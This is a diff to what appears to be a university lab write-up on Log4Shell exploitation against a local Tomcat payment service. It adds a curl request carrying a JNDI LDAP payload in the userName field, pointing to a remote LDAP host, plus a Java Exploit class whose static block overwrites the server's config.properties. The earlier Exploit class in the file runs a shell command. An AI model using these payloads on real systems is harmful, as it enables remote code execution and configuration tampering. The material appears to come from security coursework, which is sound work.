@@ -33,6 +33,8 @@ curl -X POST 'http://localhost:8080/rest/payments/payment' -H 'GATECH_ID: 904160
   "paymentDateTime": "2025-03-06T06:00:00.923163"
 }
 '
+# Exploiting another parameter
+curl -X PUT 'http://localhost:8080/rest/users/user' -H 'GATECH_ID: 904160213' -H 'Content-Type:application/json' --data-raw '{"id":8,"userId":"2134","userName":"${jndi:ldap://3232235801:1389/Exploit}","userRole":"R&D","adminYN":"Y", "accountNum":"904160213"}'
 ```
 
 # Vulnerable Headers
@@ -141,6 +143,32 @@ public class Exploit {
         try {
             String[] cmd = {"/bin/sh", "-c", "echo 'TimeToBleed!' > /usr/local/tomcat/webapps/Ronnie.txt"};
             Runtime.getRuntime().exec(cmd);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+```Java
+import java.io.*;
+import java.nio.file.*;
+
+public class Exploit {
+    static {
+        try {
+            File config = new File("/usr/local/tomcat/webapps/config.properties");
+            File temp = new File("/usr/local/tomcat/webapps/config.temp");
+
+            try (PrintWriter pw = new PrintWriter(new FileWriter(temp))) {
+                pw.println("customer.service.email=customerservice@gatech.edu");
+                pw.println("topic.name=payment"); 
+                pw.println("rating=PG");
+                pw.println("magicPower=Average");
+                pw.println("userId=904160213");
+            }
+
+            Files.move(temp.toPath(), config.toPath(), StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
+            System.out.println("Injected GATECH_ID into config as userId");
         } catch (IOException e) {
             e.printStackTrace();
         }
